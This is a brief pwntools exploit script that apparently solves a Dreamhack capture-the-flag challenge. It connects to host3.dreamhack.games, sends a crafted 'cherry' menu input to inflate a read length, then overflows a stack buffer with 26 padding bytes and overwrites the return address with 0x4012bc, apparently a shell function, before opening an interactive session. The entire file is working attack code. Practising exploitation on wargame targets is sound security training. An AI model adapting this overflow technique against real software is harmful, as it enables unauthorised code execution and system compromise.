from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18134
r = remote(HOST, PORT)

sh=0x4012bc
r.sendafter(b'Menu: ', b'cherry'+b'A'*6+b'\xff')
r.sendafter(b': ', b'A'*26+p64(sh))

r.interactive()